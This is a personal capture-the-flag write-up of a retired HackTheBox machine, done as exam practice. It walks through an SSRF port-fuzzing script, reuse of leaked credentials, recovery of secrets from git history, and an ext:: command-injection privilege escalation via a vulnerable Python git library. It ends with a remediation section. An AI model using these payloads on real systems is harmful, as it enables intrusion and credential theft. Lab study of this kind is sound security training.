# Summary

I am playing through the OSCP-prep boxes on 0xdf's blog in prep for the OSCP exam.

https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html
https://hackthebox.com/machines/boardlight

I am new to playing HTB. This is a "retired" machine with guided mode and walkthroughs available. This time I played the box in "Adventure Mode" but I admit up front that I needed some hints. In particular, I did not understand how to identify the SSRF vulnerability and I missed the exploitable piece on the box and zeroed in on the wrong vulnerability.

If you are reading this, thank you! I am mostly writing this for myself as a way to capture my actions and lessons-learned. Each of these writeups contains a "remediation" section where I discuss the lessons-learned from a defender perspective.
# Actions

## Initial Enumeration

It all started with an nmap scan:
```
sudo nmap -sC -sV 10.10.11.20 -oN editorial.nmap
```

![[Pasted image 20250606201712.png]]


HTTP is a larger attack surface, so I decide to work on that. It tells me right there the name for the site so I add an entry to /etc/hosts

```/etc/hosts
10.10.11.20     editorial.htb
```

## Web Enumeration and Exploitation

Let's see what this website is made of:
```
whatweb editorial.htb
```
![[Pasted image 20250606201936.png]]

![[Pasted image 20250606201957.png]]

This is a "static" site. There are a million static site generators out there. What these do is they "compile" a set of configuration files, text files (like markdown) into a static HTML site. It simplifies CSS/JS and integrating JS frameworks like Bootstrap.

As far as hosting goes it is remarkably simple: you just point your webserver of choice at the index.html file that the static site generator builds.

This rules out (or so I thought) any kind of back-end based exploits - there is no PHP or Flask or Node running on the target.

My initial thought was to check for IDOR and path traversal vulnerabilties. I became fixated on the "Publish With Us" page.


![[Pasted image 20250606202134.png]]


The "Send Book Info button" shoots a message off to the /upload route:

![[Pasted image 20250607094641.png]]

The preview button sends a message off to the /upload-cover route. This one became interesting to me since it actually stored the object on the server using a UUID.

![[Pasted image 20250607094845.png]]

Trying to access that object returns a failure.

![[Pasted image 20250607094908.png]]

![[Pasted image 20250607095006.png]]

So no IDOR. Path traversals also did not yield anything.

I monkeyed around that maybe there was a webengine that I could not see and I tried manipulating the request to pass in malicious code. That all failed.

What you were supposed to see (and I found out in a hint) was that the POST request to the /upload-cover route will take a URL for the preview image it is to populate on the webpage. This is not sanitized and will take references to localhost:


![[Pasted image 20250608193614.png]]

If there is nothing available at the 'bookurll' parameter, a default image is returned (what you see above). What you are supposed to do is fuzz ports on localhost until you get data to return.

0xdf used ffuf with the request to fuzz for ports. I found that technique disingenuous as you would kinda have to know exactly what to see in the output.....

To recover from needing the hint I came up with my own way to fuzz for the information. I wrote a Python script:

```
import requests

url = "http://editorial.htb/upload-cover"

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Origin': 'http://editorial.htb',
    'Referer': 'http://editorial.htb/upload',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
}

for port in range(65535):
	multipart_data = {
	    'bookurl': (None, f"http://127.0.0.1:{port}"),
	    'bookfile': ('', b'', 'application/octet-stream'),
	}
	response = requests.post(url, files=multipart_data, headers=headers)
	print(f"Port: {port}, Code: {response.status_code}, Text:{response.text}")
```

I started at 0 and I let it run. This had extremely poor performance and I had to sit there and watch the output, but eventually I had a different return value:


![[Pasted image 20250608201455.png]]

Running that through curl, again, produced nothing:

![[Pasted image 20250608201615.png]]

A brief moment of panic (and a constitution saving throw to not look at the hint) led me to realized you need to input it on the /upload-cover route - you can just do that on the form itself:

![[Pasted image 20250608202017.png]]

and you get some info:

![[Pasted image 20250608202030.png]]

cat that and pipe into jq

![[Pasted image 20250608202142.png]]

Using Burp repeater, I try all of the routes until the authors route returns something:

![[Pasted image 20250608202310.png]]

CREDS!!

username
```
dev
```
password
```
dev080217_devAPI!@
```

I assumed these were SSH creds:

![[Pasted image 20250608202430.png]]


![[Pasted image 20250608202450.png]]

user.txt

## Linux Enumeration and Exploitation as the Dev User

First things first, try sudo -l:

```
sudo -l
```
I got... nothing.

Which means I have to actually enumerate.

I have been doing this manually in my practice to get the hang of what to look for. If I can't find anything, then I use an automated tool.

I follow the steps as depicted in the CPTS course, and I check the following:

- hostname
- uname -a
- os-release
- env
- shells
- /etc/passwd
- hidden files
- check /tmp and /va/tmp
- check GTFO bins
- find configuration files
- find custom scripts
- find which scripts or binaries are in use by the root user

What I found was a random folder in /home/dev called "apps" - it was empty so I moved on.

I found where the webserver files were being hosted - it was in the /opt directory.

![[Pasted image 20250608203907.png]]

![[Pasted image 20250608204310.png]]

![[Pasted image 20250608204918.png]]

I could not find a purpose for the editorial.sock. I would get stuck on that for a few minutes. Otherwise there was a folder owned by the "prod" user that I could not get to.

The prod user, this unix socket, and the kernel version were the only things that stuck out to me. I guessed that I needed to hop over to the prod user but I didn't see it.

So I tried to exploit the kernel version with Dirty Cow.

https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

I tried a few different versions of the exploit and I could not get it to work. I lost almost 2 hours to those attempts. I also did some research on how to abuse unix sockets and not much turned up.

Stepping away from the computer for awhile I realized I needed to re-enumerate.

This time I used linenum.sh. Unfortunately, it did not find anything that I also did not find.

However, linenum also pointed out a "hidden" directory at /home/dev/apps/.git. I again, missed the chance here.

Aaaand I took a hint. Enough to see that I was supposed to roll back that /home/dev/apps with git to recover something. AAAAARRRGGHH!

In the git protocol, a "commit" is a snapshot in time of the files. Using the command `git log` will show you the commit history.

![[Pasted image 20250610101122.png]]

To revert to a previous commit you can `git checkout` the commit hash

```
git checkout 1e84a036b2f33c59e2390730699a488c65643d28
```

I did go through each one and analyze each file until I saw the creds. If you are a smarter person than me, you would read the commit messages and think that that commit where they "downgrade prod to dev" might have some juicy info in it - as the "dev" environment would be sterilized of anything related to the prod environment.

and so looking at the app_api/api.py file you see that where in the current commit there are creds for a dev user, there are now creds for a prod user

![[Pasted image 20250610102410.png]]

## Linux Enumeration and Exploitation as the Prod User

I go ahead and re-enumerate with linenum.sh just to make sure nothing else sticks out outside of that "locked" directory in the webserver directory. Nothing does so I hop into that folder:


![[Pasted image 20250610102718.png]]

![[Pasted image 20250610102845.png]]

this allows me to clone in a url? how is that useful

![[Pasted image 20250610103229.png]]

So like... I had no idea what to do with it.

I researched git exploits you can do on clones. I have never used them but I know git contains "hooks" - scripts you can add to execute at certain times and operations on a git repo.

I found this CVE:
https://nvd.nist.gov/vuln/detail/cve-2024-32002
https://amalmurali.me/posts/git-rce/

![[Pasted image 20250610104401.png]]

The box was vulnerable. However, this was another dead end that I lost an hour to. Exploits for this vulnerability involve pulling in a dirty repo and having the hook call in another repo that leads to RCE. It required me to host my own repos since this box is on a VPN without internet access. That is actually not too easy to spin up for a one-off. I realized that this could not be the problem. I was once again stumped.

Stepping away from the computer and returning, I had the idea to check the Python library. That turned up a different CVE, CVE-2022-24439. 

This was all I could find out about it:
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858

When you look at the code in that link, it is virtually the same as the code used on this box... so this was probably it.

Git has a thing https://git-scm.com/docs/git-remote-ext which allows "external" commands on certain git actions. This CVE found a vulnerability with this library where the external commands extension could be abused for code execution.

I had to monkey around with this quite a bit. My solution was NOT elegant but I was able to reach in and get the flag:
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cp% /root/root.txt% /tmp/root.txt'
```
of course I did not have permissions to view the file so I had to fix that:
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% 777% /tmp/root.txt'
```
and then I was able to get the flag:
![[Pasted image 20250610115500.png]]

Right after I looked at 0xdf's solution and his is way better - actually elevating to the root user instead of just reaching in and grabbing the flag. 

But after all of that, I got it.

# Remediation

How should this be fixed?
1. SSRF - there are several different ways to handle retrieving that file that do not involve calling to an internal service to return it. In a docker architecture - where the containers are all on an independent docker network this would be fine. On a bare metal server though, it is not. To fix this I would instead expose the Python API publicly and add sanitization code to requests to it. This code could handle the downloads. OR if the Python API is not in production (which it was not in the current state of the box) then edit the nginx conf file in sites-enabled so that you cannot route to it.
2. Credentials in plain-text files. In both cases for the dev user and prod user. These creds should be separate from those that are used to SSH into the box. I also did not understand why the box had a "dev" user and a "prod" user. User accounts need to tie to actual people or entities and their access needs to be managed by roles. There should have been users placed in dev and prod groups with those groups have requisite rights over portions of the server.
3. The clone_prod_changes.py script. I am not sure what the utility of this script is. Other than that, I could not pick on the Systems Administrator too much here. It is very very difficult to keep track of every package used, their versions and related vulnerabilities. This server was also vulnerable to Dirty Cow that is a much more severe vulnerability than the Python git library.

# Conclusion

It was good to do a box on adventure mode over guided mode. I am a little frustrated with myself that I needed help at the 2 main "breakthroughs" on the box: the SSRF and the empty .git directory. What I did not get out of the CPTS course is how I can better identify and move quickly on these vulnerabilities. For the OSCP, I won't have a ton of time to enumerate and guess I'll need to be consistently moving and executing. It looks like I'll need more practice.